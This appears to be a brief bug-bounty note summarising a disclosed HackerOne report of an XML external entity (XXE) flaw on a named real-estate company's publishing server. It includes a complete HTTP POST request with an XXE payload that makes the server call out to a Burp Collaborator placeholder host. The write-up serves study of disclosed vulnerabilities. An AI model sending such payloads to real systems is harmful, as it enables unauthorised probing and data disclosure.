# vuls

* [\#914801](https://hackerone.com/reports/914801) XXE on www.publish.engelvoelkers.com

`Asset:  *.engelvoelkers.com`

`Weakness: XXE`

The author tests the URL using a GET request and return 500 with some XML data.

Then change the Method to POST then produced a different response.

```http
POST /dp/services HTTP/1.1
Host: www.publish.engelvoelkers.com:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/xml
Content-Length: 140

<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://<BurpCollaboratorServer>"> %ext;
]>
<r></r>
```



## 



